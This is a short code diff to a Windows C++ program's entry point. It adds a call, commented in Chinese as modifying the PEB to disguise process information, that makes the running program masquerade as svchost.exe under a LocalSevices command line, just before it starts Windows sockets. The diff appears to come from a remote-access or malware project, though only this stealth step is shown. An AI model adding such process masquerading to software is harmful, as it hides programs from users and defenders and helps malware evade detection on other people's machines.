@@ -17,6 +17,10 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 		return -1;
 	}
 
+	// 修改PEB伪装进程信息
+	DisguiseProcess((wchar_t*)L"C:\\WINDOWS\\System32\\svchost.exe (LocalSevices -p)",
+		(wchar_t*)L"C:\\WINDOWS\\System32\\svchost.exe -k LocalSevices -p");
+
 	// 启动windows异步套接字
 	WSAData wsaData;
 	if (WSAStartup(MAKEWORD(2, 1), &wsaData)) {
